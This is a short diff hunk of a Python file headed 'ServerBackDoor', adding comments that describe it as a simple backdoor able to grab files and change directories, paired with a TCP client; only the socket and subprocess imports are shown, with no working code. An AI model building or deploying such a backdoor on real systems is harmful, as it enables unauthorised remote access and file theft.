@@ -1,4 +1,6 @@
 #ServerBackDoor
+#A Simple Backdoor that: Can Grab some files, and can navigate using cd
+#Use this with the TCP-Client.py 
 
 import socket 
 import subprocess
